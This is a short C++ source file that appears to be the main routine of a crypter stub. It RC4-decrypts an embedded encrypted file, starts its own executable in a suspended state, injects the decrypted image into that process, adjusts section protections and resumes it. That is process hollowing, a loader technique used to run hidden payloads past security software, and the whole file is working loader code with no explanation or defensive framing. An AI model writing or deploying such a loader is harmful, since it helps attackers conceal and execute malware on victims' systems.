#include "common.h"
#include "process_injector.h"
#include "ARC4.h"

extern std::string key;

extern uint64_t file_size;

extern uint8_t encrypted_file[];

int main(int argc, char *argv[])
{
	char path[MAX_PATH];

	if (!GetModuleFileNameA(NULL, path, MAX_PATH - 1))
	{
		printf("[-] Error GetModuleFileNameA: 0x%X\n", GetLastError());
		return -1;
	}

	ARC4 rc4;

	rc4.setKey((unsigned char*)key.c_str(), key.length());

	uint8_t* dec = (uint8_t*)malloc(file_size + 1);

	rc4.encrypt(encrypted_file, dec, file_size);

	STARTUPINFOA startup_info;
	PROCESS_INFORMATION process_information;

	ZeroMemory(&startup_info, sizeof(STARTUPINFOA));
	ZeroMemory(&process_information, sizeof(PROCESS_INFORMATION));

	if (!CreateProcessA(
		path,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&startup_info,
		&process_information
	))
		return -1;

	process_injector_t *p_injector = process_injector_t::get_instance(dec, process_information.hProcess, process_information.hThread);

	if (!p_injector->inject_into_process())
		return -1;

	if (!p_injector->set_sections_protections())
		return -1;

	ResumeThread(process_information.hThread);

	free(dec);
}